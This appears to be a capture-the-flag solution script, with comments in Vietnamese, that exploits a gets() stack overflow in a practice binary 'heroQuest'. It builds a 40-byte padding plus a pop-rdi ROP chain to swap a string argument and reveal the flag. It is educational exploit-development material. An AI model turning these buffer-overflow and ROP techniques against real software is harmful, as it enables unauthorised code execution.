from pwn import *

exe = context.binary = ELF('./heroQuest')
p = process('./heroQuest')

# __int64 save()
# {
#   _BYTE v1[32]; // [rsp+0h] [rbp-20h] BYREF

#   return gets(v1);
# }

# Cai ham nay co the bof, check tiep dieu kien de co flag

# fight( "villager" ,   50  ,     20 );
#           rdi       rsi     rdx

# Chuong trinh chi in ra flag neu dau voi "finalBoss", chuong trinh goc dang dau voi "villager"
# Vay la can phai tao mot ROPchain pop rdi de thay doi string nay => flag

pop_rdi = 0x4017ab # pop rdi ; ret
pop_rsi = 0x00000000004017a9 # pop rsi ; pop r15 ; ret
fight_addr = 0x4014db # Tim duoc trong gdb
finalBoss_string = 0x00000000004025FB # Check trong strings cua IDA

payload = b'A'*40 # bof, muon biet can bao nhieu thi vao gdb, dat breakpoint sau ham gets mot ti, pattern create 50, 
# copy pattern vao luc bao dat ten save file, pattern search $rsp
# gef➤  pattern search $rsp
# [+] Searching for '6661616161616161'/'6161616161616166' with period=8
# [+] Found at offset 40 (little-endian search) likely


payload += p64(pop_rdi)
payload += p64(finalBoss_string) 

# Cai nay vut vao cho vui hehe
# payload += p64(pop_rsi)
# payload += p64(69) # RSI
# payload += p64(0) # R15 = 0 ko su dung den
# payload += p64(fight_addr)
# input()

p.sendlineafter(b"First, enter the name for your save file!", b"skibidi\n")
p.sendlineafter(b"You can go (n)orth, (e)ast, (s)outh, or (w)est.", b"w")
p.sendlineafter(b"Options: (a)sk about the castle, (f)ight villagers, (r)est at the inn to save, or (g)o back",b'r')
p.sendlineafter(b"You decide to take a rest. Enter the name for your save file:",payload)

p.interactive()